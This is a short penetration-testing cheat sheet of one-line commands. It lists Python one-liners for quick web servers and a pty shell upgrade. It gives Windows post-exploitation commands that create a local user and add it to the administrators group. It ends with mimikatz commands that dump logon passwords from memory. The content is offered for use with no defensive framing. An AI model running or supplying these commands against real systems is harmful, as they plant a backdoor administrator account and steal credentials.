
### Simple Web Servers

>python3 -m http.server

>python -m SimpleHTTPServer 80


### Shell Upgrade!

>python -c "import pty; pty.spawn('/bin/bash')"

>/bin/bash -i


### Post Exploitation

Add new user and add to local admin group

> net user gary password /add

> net localgroup administrators gary /add



## Get Passwords

> privilege::debug

> sekurlsa::logonpasswords
